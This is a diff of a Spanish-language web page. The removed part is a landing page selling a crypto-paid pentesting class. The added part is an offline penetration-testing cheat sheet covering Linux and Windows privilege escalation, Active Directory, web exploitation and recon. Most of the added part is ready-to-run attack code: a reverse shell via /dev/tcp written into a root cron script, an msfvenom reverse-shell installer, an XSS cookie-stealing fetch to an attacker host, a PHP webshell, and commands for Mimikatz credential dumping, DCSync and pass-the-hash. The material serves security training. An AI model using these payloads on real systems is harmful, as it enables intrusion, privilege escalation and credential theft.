-          <div class="flex items-start gap-space-md">
-            <span class="relative z-10 w-10 h-10 md:w-12 md:h-12 rounded-full bg-surface-container-high text-primary flex items-center justify-center font-label-lg text-label-lg shrink-0">2</span>
-            <div class="flex-1">
-              <h3 class="font-headline-sm text-headline-sm text-on-surface">Envía el comprobante por WhatsApp</h3>
-              <p class="font-body-sm text-body-sm text-on-surface-variant mt-1">El mensaje ya va escrito: solo adjunta la captura de la transacción.</p>
-              <a class="cta-glow mt-space-md w-full sm:w-auto inline-flex items-center justify-center gap-space-sm h-12 px-space-lg rounded-xl bg-primary-container text-on-primary-fixed font-label-lg text-label-lg uppercase tracking-wider transition-colors hover:bg-primary-fixed-dim" data-wa="comprobante" data-wa-msg="Hola Team 01, ya envié los US$10 por BEP20 para la clase de Pentesting. Te adjunto el comprobante." href="#pago">
-                <svg aria-hidden="true" class="w-5 h-5"><use href="#i-wa"/></svg>Enviar comprobante
-              </a>
-            </div>
-          </div>
-        </li>
-
-        <!-- Paso 3: acceso + horario -->
-        <li class="relative rounded-xl bg-surface-container-low p-space-md md:p-space-lg">
-          <div class="flex items-start gap-space-md">
-            <span class="relative z-10 w-10 h-10 md:w-12 md:h-12 rounded-full bg-surface-container-high text-primary flex items-center justify-center font-label-lg text-label-lg shrink-0">3</span>
-            <div>
-              <h3 class="font-headline-sm text-headline-sm text-on-surface">Recibe tu acceso y agenda tu clase</h3>
-              <p class="font-body-sm text-body-sm text-on-surface-variant mt-1">Te doy el acceso a Discord y acordamos el horario de la clase directamente contigo.</p>
-            </div>
-          </div>
-        </li>
-      </ol>
-
-      <p id="pago-otro" class="mt-space-lg text-center font-body-sm text-body-sm text-on-surface-variant">
-        ¿No tienes cripto?
-        <a class="inline-flex items-center gap-space-xs font-semibold text-primary hover:underline underline-offset-4" data-wa="sin-cripto" data-wa-msg="Hola Team 01, quiero la clase de Pentesting de US$10 pero no tengo cripto. ¿Qué otro medio de pago puedo usar?" href="#pago">
-          <svg aria-hidden="true" class="w-4 h-4"><use href="#i-wa"/></svg>Consulta otro medio de pago
-        </a>
-      </p>
-    </div>
-  </section>
-
-  <!-- 4. FAQ -->
-  <section id="faq" class="bg-surface py-space-xl md:py-16">
-    <div class="max-w-[760px] mx-auto px-margin-mobile md:px-margin">
-      <h2 class="font-headline-lg text-headline-lg-mobile md:text-headline-lg text-on-surface tracking-tight text-center mb-space-lg">Preguntas frecuentes</h2>
-      <div class="flex flex-col gap-space-sm">
-        <details class="rounded-xl bg-surface-container-low">
-          <summary class="flex items-center justify-between gap-space-md p-space-md md:p-space-lg font-label-lg text-label-lg text-on-surface">¿Necesito experiencia previa?<span class="chevron material-symbols-outlined text-on-surface-variant transition-transform shrink-0">expand_more</span></summary>
-          <p class="px-space-md md:px-space-lg pb-space-md md:pb-space-lg text-on-surface-variant">No. Empezamos por fundamentos de redes y Linux.</p>
-        </details>
-        <details class="rounded-xl bg-surface-container-low">
-          <summary class="flex items-center justify-between gap-space-md p-space-md md:p-space-lg font-label-lg text-label-lg text-on-surface">¿Cuándo es la clase?<span class="chevron material-symbols-outlined text-on-surface-variant transition-transform shrink-0">expand_more</span></summary>
-          <p class="px-space-md md:px-space-lg pb-space-md md:pb-space-lg text-on-surface-variant">Cuando confirmo tu pago, acordamos el horario por WhatsApp y te paso el acceso a Discord.</p>
-        </details>
-        <details class="rounded-xl bg-surface-container-low">
-          <summary class="flex items-center justify-between gap-space-md p-space-md md:p-space-lg font-label-lg text-label-lg text-on-surface">¿Me equivoqué de red al enviar, qué hago?<span class="chevron material-symbols-outlined text-on-surface-variant transition-transform shrink-0">expand_more</span></summary>
-          <p class="px-space-md md:px-space-lg pb-space-md md:pb-space-lg text-on-surface-variant">Las transacciones cripto no se pueden revertir. Revisa que sea BEP20 antes de enviar y, si dudas, escríbeme primero.</p>
-        </details>
-        <details class="rounded-xl bg-surface-container-low">
-          <summary class="flex items-center justify-between gap-space-md p-space-md md:p-space-lg font-label-lg text-label-lg text-on-surface">¿Incluye certificado?<span class="chevron material-symbols-outlined text-on-surface-variant transition-transform shrink-0">expand_more</span></summary>
-          <p class="px-space-md md:px-space-lg pb-space-md md:pb-space-lg text-on-surface-variant">No. Es una ruta para empezar con dirección; al final te oriento sobre qué certificaciones buscar.</p>
-        </details>
-      </div>
-    </div>
-  </section>
-
-  <!-- 5. CIERRE -->
-  <section id="cta-final" class="relative overflow-hidden bg-surface-container-lowest py-space-xl md:py-20">
-    <img alt="" aria-hidden="true" class="pointer-events-none absolute inset-0 h-full w-full object-cover object-center" src="assets/Footer.gif"/>
-    <div aria-hidden="true" class="pointer-events-none absolute inset-0 bg-surface-container-lowest/65"></div>
-    <div class="relative z-10 max-w-[760px] mx-auto px-margin-mobile md:px-margin text-center flex flex-col items-center gap-space-md">
-      <h2 class="font-headline-lg text-headline-lg-mobile md:text-headline-lg text-on-surface tracking-tight">
-        Deja de buscar. <span class="text-primary">Empieza con una ruta.</span>
-      </h2>
-      <a class="w-full sm:w-auto inline-flex items-center justify-center gap-space-sm h-14 px-space-xl rounded-xl bg-primary-container text-on-primary-fixed font-label-lg text-label-lg uppercase tracking-wider transition-transform hover:-translate-y-0.5" href="#pago">
-        <span class="material-symbols-outlined text-[22px]">bolt</span>Acceder por US$10
-      </a>
-    </div>
-  </section>
-
-</main>
-
-<footer class="bg-surface-container-lowest border-t border-outline-variant/40 pb-24 md:pb-0">
-  <div class="max-w-[1200px] mx-auto px-margin-mobile md:px-margin py-space-lg flex flex-col md:flex-row items-center justify-between gap-space-sm text-center md:text-left">
-    <span class="font-body-sm text-body-sm text-on-surface-variant">Contenido educativo de hacking ético. Practica solo en entornos autorizados.</span>
-    <span class="font-label-sm text-label-sm text-on-surface-variant uppercase">© <span data-year></span> juanicerouno</span>
-  </div>
-</footer>
-
-<!-- Barra fija móvil: visible fuera del hero, del bloque de pago y del cierre -->
-<div id="sticky-cta" class="md:hidden fixed inset-x-0 bottom-0 z-40 bg-surface-container-lowest/95 backdrop-blur-md px-margin-mobile pt-space-sm pb-[calc(0.5rem+env(safe-area-inset-bottom))] shadow-[0_-4px_20px_rgba(0,0,0,0.6)]">
-  <div class="flex items-center gap-space-sm">
-    <a class="flex-1 inline-flex items-center justify-center gap-space-xs h-12 rounded-xl bg-primary-container text-on-primary-fixed font-label-md text-label-md uppercase tracking-wider" href="#pago">
-      <span class="material-symbols-outlined text-[18px]" data-sticky-icon>account_balance_wallet</span><span data-sticky-label>Acceder · US$10</span>
-    </a>
-    <a aria-label="Escribir por WhatsApp" class="inline-flex items-center justify-center w-12 h-12 rounded-xl bg-surface-container-high text-primary" data-wa="sticky" href="#pago">
-      <svg aria-hidden="true" class="w-6 h-6"><use href="#i-wa"/></svg>
-    </a>
-  </div>
+<div class="search-wrap">
+  <input id="q" type="text" placeholder="buscar comando, técnica, binario... (ej: sudo, SUID, JuicyPotato)">
 </div>
 
+<nav id="filters"></nav>
+
+<main id="main"></main>
+
+<footer>github.com/Juanizxcvbn · generado para consulta rápida offline</footer>
+
 <script>
-  const CUPOS_OCUPADOS = 7; // 0 a 10. 10 = clase llena
-
-  const WHATSAPP_CONFIG = {
-    phone: "5491162488944",
-    message: "Hola Team 01, quiero acceder a la clase de Pentesting de US$10."
-  };
-
-  // Cambia aquí la dirección, la red o el QR de cada moneda.
-  const WALLETS = {
-    usdt: {
-      token: "Tether (USDT)",
-      network: "BEP20 · BNB Smart Chain",
-      address: "0x70B330d176d40BA85dF884B48553601fCcFAbD16",
-      amount: "Envía 10 USDT.",
-      note: 'Usa <strong class="text-on-surface">solo la red BEP20</strong>. Si envías USDT por otra red, los fondos se pierden.',
-      qr: "assets/QR_USDT.jpeg",
-      qrAlt: "Código QR para enviar 10 USDT por BEP20",
-      qrCaption: "QR de 10 USDT",
-      wa: "Hola Team 01, ya envié 10 USDT por la red BEP20 para la clase de Pentesting. Te adjunto el comprobante."
-    },
-    btc: {
-      token: "Bitcoin (BTC)",
-      network: "BEP20 · BNB Smart Chain",
-      address: "0x70B330d176d40BA85dF884B48553601fCcFAbD16",
-      amount: "Envía el equivalente a US$10 en BTC. No envíes 10 BTC.",
-      note: 'En BEP20 el BTC llega como token (BTCB). Envía <strong class="text-on-surface">solo el equivalente a US$10</strong> y únicamente por esa red.',
-      qr: "assets/QR_BTC.jpeg",
-      qrAlt: "Código QR para enviar BTC por BEP20",
-      qrCaption: "QR de BTC",
-      wa: "Hola Team 01, ya envié el equivalente a US$10 en BTC por la red BEP20 para la clase de Pentesting. Te adjunto el comprobante."
-    }
-  };
-
-  const walletAddress = document.getElementById("wallet");
-  const walletTabs = document.querySelectorAll("[data-wallet]");
-  const proofLink = document.querySelector('[data-wa="comprobante"]');
-
-  function showWallet(key) {
-    const wallet = WALLETS[key];
-    document.getElementById("wallet-amount").textContent = wallet.amount;
-    document.getElementById("wallet-token").textContent = wallet.token;
-    document.getElementById("wallet-network").textContent = wallet.network;
-    document.getElementById("wallet-note").innerHTML = wallet.note;
-    walletAddress.textContent = wallet.address;
-    const qr = document.getElementById("wallet-qr");
-    qr.src = wallet.qr;
-    qr.alt = wallet.qrAlt;
-    document.getElementById("wallet-qr-caption").textContent = wallet.qrCaption;
-    document.getElementById("wallet-panel").setAttribute("aria-labelledby", "tab-" + key);
-    if (proofLink) {
-      proofLink.dataset.waMsg = wallet.wa;
-      proofLink.href = waUrl(wallet.wa);
-    }
-    walletTabs.forEach((tab) => {
-      const active = tab.dataset.wallet === key;
-      tab.setAttribute("aria-selected", String(active));
-      tab.classList.toggle("bg-primary-container", active);
-      tab.classList.toggle("text-on-primary-fixed", active);
-      tab.classList.toggle("bg-surface-container-high", !active);
-      tab.classList.toggle("text-on-surface-variant", !active);
-    });
+const DATA = [
+  {
+    id:"linux", title:"🐧 Linux Privilege Escalation",
+    sections:[
+      {h:"Enumeración inicial", blocks:[
+        {p:"Sistema y kernel", code:`uname -a\ncat /etc/os-release\ncat /proc/version\nhostname`},
+        {p:"Usuario actual y permisos", code:`id\nwhoami\nsudo -l\ncat /etc/passwd | grep -v nologin\ngroups`},
+        {p:"Procesos y servicios", code:`ps aux\nps -ef --forest\nnetstat -tulpn\nss -tulpn`},
+        {p:"Cron jobs", code:`cat /etc/crontab\nls -la /etc/cron.*\ncrontab -l\ncat /var/spool/cron/crontabs/* 2>/dev/null`},
+        {p:"Variables de entorno y PATH", code:`env\necho $PATH\ncat /etc/environment`},
+        {p:"Montajes y particiones", code:`mount\ncat /etc/fstab\nlsblk`},
+        {p:"Scripts automatizados (correr primero)", code:`curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n./LinEnum.sh -t\n./lse.sh -l1`}
+      ]},
+      {h:"SUID / SGID", blocks:[
+        {p:"Buscar binarios SUID", code:`find / -perm -4000 -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null`},
+        {p:"Buscar binarios SGID", code:`find / -perm -2000 -type f 2>/dev/null`},
+        {p:"Listar SUID con dueño y permisos legibles", code:`find / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null`},
+        {p:"Chequear contra GTFOBins", code:`https://gtfobins.github.io/`},
+        {p:"Explotación genérica (sh con -p)", code:`./binario -exec /bin/sh -p \\; -quit`}
+      ]},
+      {h:"Sudo mal configurado", blocks:[
+        {p:"Ver qué podés correr", code:`sudo -l`},
+        {p:"Shells comunes vía sudo (chequear en GTFOBins)", code:`sudo /bin/sh -p\nsudo vim -c ':!/bin/sh'\nsudo less /etc/passwd    # luego !/bin/sh dentro de less\nsudo find . -exec /bin/sh \\;\nsudo awk 'BEGIN {system("/bin/sh")}'\nsudo python3 -c 'import os; os.system("/bin/sh")'\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\nsudo nmap --interactive   # luego !sh`},
+        {p:"LD_PRELOAD (si sudo lo permite con env_keep)", code:`cat > /tmp/preload.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n    unsetenv("LD_PRELOAD");\n    setresuid(0,0,0);\n    system("/bin/sh -p");\n}\nEOF\ngcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles\nsudo LD_PRELOAD=/tmp/preload.so <comando_permitido>`},
+        {p:"Sudo versión vulnerable (CVE-2019-14287 / CVE-2021-3156 Baron Samedit)", code:`sudo -V\n# CVE-2019-14287: sudo -u#-1 /bin/bash\n# CVE-2021-3156: buscar exploit "sudo heap overflow" en searchsploit`}
+      ]},
+      {h:"Capabilities", blocks:[
+        {p:"Listar binarios con capabilities", code:`getcap -r / 2>/dev/null`},
+        {p:"cap_setuid (python)", code:`python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`},
+        {p:"cap_setuid (perl)", code:`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`},
+        {p:"cap_dac_read_search (leer cualquier archivo)", code:`tar -cvf shadow.tar.gz /etc/shadow --absolute-names\n# o con python\npython3 -c 'import ctypes; ctypes.CDLL("libc.so.6").open("/etc/shadow", 0)'`}
+      ]},
+      {h:"Cron jobs vulnerables", blocks:[
+        {p:"Script de cron escribible (corre como root)", code:`ls -la /ruta/al/script_del_cron.sh\necho 'bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1' >> /ruta/al/script_del_cron.sh`},
+        {p:"PATH relativo dentro del cron (hijacking)", code:`cat /etc/crontab   # ver si falta /usr/bin en el PATH del cron\necho '/bin/bash -p' > /ruta/en/path/del/cron/comando_que_llama\nchmod +x /ruta/en/path/del/cron/comando_que_llama`},
+        {p:"Wildcard injection (tar/rsync/chown corriendo con *)", code:`# si root corre: tar czf backup.tar.gz *\ncd /directorio/vigilado\necho '' > "--checkpoint=1"\necho '' > "--checkpoint-action=exec=sh shell.sh"\necho '/bin/bash -p' > shell.sh; chmod +x shell.sh`}
+      ]},
+      {h:"Docker / contenedores", blocks:[
+        {p:"Usuario en grupo docker (equivale a root)", code:`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`},
+        {p:"Dentro de un contenedor: escape si el socket Docker está montado", code:`ls -la /var/run/docker.sock\ndocker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh`},
+        {p:"Chequear si el contenedor corre --privileged", code:`fdisk -l\nmount /dev/sda1 /mnt`}
+      ]},
+      {h:"Permisos de archivos sensibles", blocks:[
+        {p:"/etc/passwd escribible (crear usuario root)", code:`openssl passwd -1 -salt xxx contraseña123\necho 'hacker:$1$xxx$HASHGENERADO:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker`},
+        {p:"/etc/sudoers escribible", code:`echo 'usuario ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers`},
+        {p:"Buscar archivos/directorios escribibles por otros", code:`find / -writable -type d 2>/dev/null | grep -v proc\nfind / -perm -o+w -type f 2>/dev/null | grep -v proc`}
+      ]},
+      {h:"Kernel exploits (último recurso)", blocks:[
+        {p:"⚠️ Riesgoso, puede colgar el sistema", code:`uname -a\nsearchsploit linux kernel <version>\n# Dirty Pipe (CVE-2022-0847), DirtyCow (CVE-2016-5195), overlayfs (CVE-2021-3493)`}
+      ]},
+      {h:"Credenciales expuestas", blocks:[
+        {p:"Buscar passwords en configs", code:`grep -r "password" /etc/ 2>/dev/null\nfind / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "pass" 2>/dev/null\ncat /var/www/html/**/config.php 2>/dev/null`},
+        {p:"Historial de bash", code:`cat ~/.bash_history\ncat /root/.bash_history 2>/dev/null`},
+        {p:"Llaves SSH", code:`find / -name "id_rsa" 2>/dev/null\nfind / -name "authorized_keys" 2>/dev/null\ncat ~/.ssh/id_rsa`},
+        {p:"Credenciales en bases de datos locales", code:`mysql -u root -p\ncat /var/www/html/wp-config.php | grep DB_\nsqlite3 database.db ".tables"`}
+      ]},
+      {h:"Path hijacking", blocks:[
+        {p:"Si un SUID llama binarios sin path completo", code:`strings /ruta/al/binario_suid | grep -v "^/"\necho '/bin/sh' > /tmp/nombre_binario\nchmod +x /tmp/nombre_binario\nexport PATH=/tmp:$PATH`}
+      ]},
+      {h:"NFS no_root_squash", blocks:[
+        {p:"Montar y abusar de un share NFS sin root_squash", code:`showmount -e <IP>\nmkdir /tmp/nfs\nmount -t nfs <IP>:/share /tmp/nfs -o nolock\ncp /bin/bash /tmp/nfs/bash\nchmod +s /tmp/nfs/bash\n/share/bash -p`}
+      ]}
+    ]
+  },
+  {
+    id:"windows", title:"🪟 Windows Privilege Escalation",
+    sections:[
+      {h:"Enumeración inicial", blocks:[
+        {p:"Sistema y versión", code:`systeminfo\nhostname\nwhoami /all`},
+        {p:"PowerShell", code:`Get-ComputerInfo\n[System.Environment]::OSVersion.Version`},
+        {p:"Usuario, privilegios y grupos", code:`whoami\nwhoami /priv\nwhoami /groups\nnet user %username%`},
+        {p:"Usuarios y grupos del sistema", code:`net user\nnet localgroup\nnet localgroup administrators`},
+        {p:"Procesos y servicios", code:`tasklist /v\nsc query\nwmic process list full`},
+        {p:"Scripts automatizados", code:`.\\winPEASx64.exe\n\npowershell -ep bypass\nImport-Module .\\PowerUp.ps1\nInvoke-AllChecks`}
+      ]},
+      {h:"Privilegios de token", blocks:[
+        {p:"SeImpersonate / SeAssignPrimaryToken → Potato exploits", code:`JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t * -c {CLSID}\nPrintSpoofer.exe -i -c cmd\nRoguePotato.exe -r <IP_atacante> -e "cmd.exe" -l 9999\nGodPotato.exe -cmd "cmd /c whoami"`},
+        {p:"SeBackup / SeRestore → copiar SAM/SYSTEM", code:`reg save hklm\\sam C:\\temp\\sam.save\nreg save hklm\\system C:\\temp\\system.save\nreg save hklm\\security C:\\temp\\security.save`},
+        {p:"SeTakeOwnership", code:`takeown /f C:\\Windows\\System32\\config\\SAM\nicacls C:\\Windows\\System32\\config\\SAM /grant %username%:F`}
+      ]},
+      {h:"Servicios mal configurados", blocks:[
+        {p:"Permisos de servicio", code:`accesschk.exe -uwcqv "Authenticated Users" * /accepteula\nsc qc <nombre_servicio>`},
+        {p:"Unquoted Service Path", code:`wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """\ncopy payload.exe "C:\\Program Files\\Mi.exe"\nsc stop <servicio>\nsc start <servicio>`},
+        {p:"Reemplazar binario del servicio", code:`icacls "C:\\ruta\\servicio.exe"\ncopy payload.exe "C:\\ruta\\servicio.exe"\nsc stop <servicio>\nsc start <servicio>`}
+      ]},
+      {h:"Permisos de archivos y registro", blocks:[
+        {p:"AlwaysInstallElevated", code:`reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f msi -o malicious.msi\nmsiexec /quiet /qn /i malicious.msi`},
+        {p:"Tareas programadas", code:`schtasks /query /fo LIST /v`}
+      ]},
+      {h:"Credenciales expuestas", blocks:[
+        {p:"Buscar passwords en archivos", code:`findstr /si password *.txt *.ini *.config *.xml\ndir /s *pass* == *cred* == *vnc* == *.config*`},
+        {p:"Credenciales en registro", code:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"\nreg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s`},
+        {p:"SAM/SYSTEM locales", code:`copy C:\\Windows\\System32\\config\\SAM C:\\temp\\\ncopy C:\\Windows\\System32\\config\\SYSTEM C:\\temp\\`},
+        {p:"Historial de PowerShell", code:`type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`},
+        {p:"Credential Manager", code:`cmdkey /list\nvaultcmd /listcreds:"Windows Credentials"`}
+      ]},
+      {h:"Kernel exploits (último recurso)", blocks:[
+        {p:"⚠️ Riesgoso", code:`systeminfo\n.\\Watson.exe\n# Buscar con Windows-Exploit-Suggester según versión/parches`}
+      ]},
+      {h:"Startup / Autoruns / Persistencia explotable", blocks:[
+        {p:"Programas en el Startup folder (si son escribibles)", code:`dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"\ndir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"`},
+        {p:"Claves de registro Run/RunOnce", code:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"\nreg query "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"`},
+        {p:"accesschk sobre esas claves/carpetas para ver si son escribibles", code:`accesschk.exe -wvu "C:\\ruta\\autorun" /accepteula`}
+      ]},
+      {h:"UAC Bypass", blocks:[
+        {p:"Chequear nivel de UAC", code:`reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin`},
+        {p:"fodhelper.exe bypass (si el usuario es admin local, sin prompt)", code:`reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "C:\\payload.exe" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f\nfodhelper.exe`}
+      ]},
+      {h:"Pass-the-Hash / Dumping de credenciales", blocks:[
+        {p:"Mimikatz — dump de hashes/tickets en memoria (requiere admin)", code:`mimikatz.exe\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam`},
+        {p:"Pass-the-Hash con hash NTLM obtenido", code:`pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> //<IP> cmd.exe\nevil-winrm -i <IP> -u administrator -H <NTLM_HASH>`}
+      ]}
+    ]
+  },
+  {
+    id:"ad", title:"🏰 Active Directory",
+    sections:[
+      {h:"Enumeración", blocks:[
+        {p:"BloodHound (recolección)", code:`SharpHound.exe -c All\n# o en Linux\nbloodhound-python -u <user> -p <pass> -ns <IP_DC> -d <dominio> -c All`},
+        {p:"PowerView — básico", code:`Import-Module .\\PowerView.ps1\nGet-DomainUser\nGet-DomainComputer\nGet-DomainGroupMember "Domain Admins"`},
+        {p:"Enumeración por línea de comandos nativa", code:`net user /domain\nnet group "Domain Admins" /domain\nnslookup -type=srv _ldap._tcp.dc._msdcs.<dominio>`}
+      ]},
+      {h:"LLMNR/NBT-NS Poisoning", blocks:[
+        {p:"Responder — capturar hashes NTLMv2 en la red", code:`responder -I eth0 -wrf`},
+        {p:"Crackear el hash capturado", code:`hashcat -m 5600 hash.txt rockyou.txt`}
+      ]},
+      {h:"Kerberoasting", blocks:[
+        {p:"Pedir TGS de cuentas de servicio y crackear offline", code:`GetUserSPNs.py <dominio>/<usuario>:<pass> -dc-ip <IP_DC> -request\nhashcat -m 13100 tgs_hashes.txt rockyou.txt`}
+      ]},
+      {h:"AS-REP Roasting", blocks:[
+        {p:"Usuarios sin preauth Kerberos", code:`GetNPUsers.py <dominio>/ -usersfile usuarios.txt -dc-ip <IP_DC> -no-pass\nhashcat -m 18200 asrep_hashes.txt rockyou.txt`}
+      ]},
+      {h:"GPP Passwords (cpassword)", blocks:[
+        {p:"Buscar contraseñas en SYSVOL (Group Policy Preferences)", code:`findstr /S /I cpassword \\\\<dominio>\\sysvol\\<dominio>\\policies\\*.xml\n# Desencriptar con gpp-decrypt (Linux)\ngpp-decrypt <cpassword_encriptado>`}
+      ]},
+      {h:"Pass-the-Ticket / Delegación", blocks:[
+        {p:"Exportar e inyectar tickets Kerberos (Mimikatz)", code:`mimikatz.exe\nsekurlsa::tickets /export\nkerberos::ptt ticket.kirbi`},
+        {p:"Constrained/Unconstrained Delegation (abuso con Rubeus)", code:`Rubeus.exe monitor /interval:5 /nowrap\nRubeus.exe s4u /user:<cuenta> /rc4:<hash> /impersonateuser:administrator /msdsspn:<SPN> /ptt`}
+      ]},
+      {h:"DCSync", blocks:[
+        {p:"Si la cuenta tiene permisos de replicación (Replicating Directory Changes)", code:`mimikatz.exe\nlsadump::dcsync /domain:<dominio> /user:Administrator`},
+        {p:"Con secretsdump.py (Linux)", code:`secretsdump.py <dominio>/<usuario>:<pass>@<IP_DC>`}
+      ]}
+    ]
+  },
+  {
+    id:"web", title:"🌐 Web Exploitation",
+    sections:[
+      {h:"SQL Injection", blocks:[
+        {p:"Detección manual básica", code:`' OR '1'='1\n' OR '1'='1' -- -\n' UNION SELECT NULL,NULL,NULL-- -`},
+        {p:"sqlmap — automatizado", code:`sqlmap -u "http://target/page?id=1" --dbs\nsqlmap -u "http://target/page?id=1" -D nombre_db --tables\nsqlmap -u "http://target/page?id=1" --os-shell`}
+      ]},
+      {h:"Cross-Site Scripting (XSS)", blocks:[
+        {p:"Payloads de prueba", code:`<scr` + `ipt>alert(document.domain)</scr` + `ipt>\n<img src=x onerror=alert(1)>\n"><svg onload=alert(1)>`},
+        {p:"Robo de cookies (XSS almacenado)", code:`<scr` + `ipt>fetch('http://<IP_atacante>/?c='+document.cookie)</scr` + `ipt>`}
+      ]},
+      {h:"Local / Remote File Inclusion", blocks:[
+        {p:"LFI básico", code:`http://target/page.php?file=../../../../etc/passwd\nphp://filter/convert.base64-encode/resource=index.php`},
+        {p:"LFI a RCE vía log poisoning", code:`# Inyectar PHP en el User-Agent y luego incluir el log\nphp://filter/convert.base64-encode/resource=/var/log/apache2/access.log`}
+      ]},
+      {h:"File Upload Bypass", blocks:[
+        {p:"Extensiones alternativas / doble extensión", code:`shell.pHp\nshell.php.jpg\nshell.php%00.jpg\nshell.phtml`},
+        {p:"Magic bytes para pasar validación de tipo de imagen", code:`GIF89a;\n<?php system($_GET['cmd']); ?>`}
+      ]},
+      {h:"Command Injection", blocks:[
+        {p:"Encadenar comandos", code:`; whoami\n| whoami\n&& whoami\n\`whoami\`\n$(whoami)`}
+      ]},
+      {h:"SSRF", blocks:[
+        {p:"Payloads típicos (acceder a metadata/internos)", code:`http://127.0.0.1/\nhttp://169.254.169.254/latest/meta-data/\nhttp://localhost:<puerto_interno>/`}
+      ]}
+    ]
+  },
+  {
+    id:"recon", title:"🧰 Enumeración / Fuzzing",
+    sections:[
+      {h:"Escaneo de puertos (nmap)", blocks:[
+        {p:"Escaneo rápido de todos los puertos", code:`nmap -p- --min-rate=1000 -T4 <IP>`},
+        {p:"Escaneo detallado de los puertos encontrados", code:`nmap -p<puertos_encontrados> -sC -sV -T4 <IP> -oN nmap_detallado.txt`},
+        {p:"Top 1000 puertos (default, rápido para primer vistazo)", code:`nmap <IP>`},
+        {p:"UDP (más lento, probar puertos comunes primero)", code:`nmap -sU --top-ports 20 <IP>\nnmap -sU -p- --min-rate=1000 <IP>   # completo, tarda mucho más`},
+        {p:"Detección de SO y versión de servicios", code:`nmap -O -sV <IP>`},
+        {p:"Scripts por defecto + detección de versión (combo típico)", code:`nmap -sC -sV -p- <IP>`},
+        {p:"Escaneo agresivo (OS, versiones, scripts y traceroute juntos)", code:`nmap -A <IP>`},
+        {p:"TCP Connect scan (sin privilegios root/sudo)", code:`nmap -sT <IP>`},
+        {p:"SYN scan (stealth, requiere sudo — el más usado)", code:`sudo nmap -sS <IP>`},
+        {p:"Scripts NSE de vulnerabilidades conocidas", code:`nmap --script vuln <IP>\nnmap --script vuln -p 445 <IP>   # ej. apuntado a SMB`},
+        {p:"Scripts por categoría (safe, default, auth, discovery, etc.)", code:`nmap --script=default,safe <IP>\nnmap --script=smb-enum-shares,smb-os-discovery -p445 <IP>`},
+        {p:"Ping scan (solo descubrir hosts vivos, sin escanear puertos)", code:`nmap -sn <IP>/24`},
+        {p:"Sin ping (si el host bloquea ICMP y nmap lo descarta como caído)", code:`nmap -Pn <IP>`},
+        {p:"Evasión básica (firewalls/IDS poco estrictos)", code:`nmap -f <IP>              # fragmentar paquetes\nnmap -D RND:5 <IP>        # decoys aleatorios\nnmap --source-port 53 <IP> # spoofear puerto origen`},
+        {p:"Timing templates (velocidad vs sigilo)", code:`nmap -T0 <IP>   # paranoico, muy lento\nnmap -T2 <IP>   # sigiloso\nnmap -T4 <IP>   # agresivo, el más usado en labs\nnmap -T5 <IP>   # insano, ruidoso`},
+        {p:"Guardar en todos los formatos (grep + XML + normal)", code:`nmap -p- -sC -sV <IP> -oA nmap_full`},
+        {p:"Escanear desde una lista de IPs/red", code:`nmap -iL targets.txt\nnmap 192.168.1.0/24`}
+      ]},
+      {h:"Fuzzing de directorios y archivos", blocks:[
+        {p:"gobuster — directorios", code:`gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50`},
+        {p:"gobuster — subdominios (vhost)", code:`gobuster vhost -u http://<dominio> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain`},
+        {p:"feroxbuster — recursivo, más rápido en wordlists grandes", code:`feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 50 -d 3`},
+        {p:"ffuf — fuzzing genérico (dirs, params, subdominios)", code:`ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404\nffuf -u http://<dominio>/ -H "Host: FUZZ.<dominio>" -w subdomains.txt -fs <tamaño_respuesta_default>\nffuf -u http://<IP>/page.php?FUZZ=test -w params.txt -mc 200`},
+        {p:"dirb (más lento, pero viene por default en muchas distros)", code:`dirb http://<IP> /usr/share/wordlists/dirb/common.txt`}
+      ]},
+      {h:"Wordlists — buscar e instalar", blocks:[
+        {p:"Buscar wordlists ya instaladas en el sistema", code:`locate wordlist\nlocate rockyou\nfind / -iname "*wordlist*" 2>/dev/null\nfind / -iname "rockyou*" 2>/dev/null`},
